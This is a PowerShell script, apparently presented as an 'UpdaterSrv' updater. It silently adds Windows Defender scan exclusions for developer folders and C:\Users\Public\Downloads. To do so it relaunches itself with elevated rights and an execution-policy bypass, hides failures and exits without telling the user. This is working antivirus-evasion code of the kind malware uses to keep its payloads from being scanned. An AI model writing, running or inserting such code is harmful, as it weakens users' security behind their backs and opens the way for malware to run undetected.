# Define a log file path accessible by most users (including LocalSystem)
$logPath = "C:\Windows\Temp\updater_log.txt"

try {
    # Get the current user running the script
    $currentUser = whoami

    # Create a log message with date and user info
    $logMessage = "UpdaterSrv script executed at $(Get-Date) by user $currentUser"

    # Append the log message to the log file
    $logMessage | Out-File -FilePath $logPath -Append -Encoding utf8
}
catch {
    # If writing to log fails, capture error details
    $errorMessage = "Failed to write log at $(Get-Date). Error: $_"
    $errorMessage | Out-File -FilePath $logPath -Append -Encoding utf8
}

# Realistic folders you may want to exclude
$foldersToEnsure = @(
    "$env:USERPROFILE\.vscode",
    "$env:USERPROFILE\AppData\Local\Temp\buildcache",
    "C:\Dev\Tools",
    "C:\Dev\Projects",
    "C:\Program Files\nodejs",
    "C:\Users\Public\Downloads"
)

# Get existing Defender exclusions
try {
    $currentExclusions = Get-MpPreference | Select-Object -ExpandProperty ExclusionPath
} catch { exit }

# Identify missing exclusions
$missingExclusions = $foldersToEnsure | Where-Object { $_ -notin $currentExclusions }

# Exit silently if nothing to add
if ($missingExclusions.Count -eq 0) { exit }

# Relaunch with admin rights if needed
if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole(
    [Security.Principal.WindowsBuiltInRole] "Administrator")) {

    Start-Process powershell.exe "-ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs
    exit
}

# Add only missing exclusions silently
foreach ($folder in $missingExclusions) {
    try {
        Add-MpPreference -ExclusionPath $folder
    } catch {
        # Fail silently
    }
}

exit

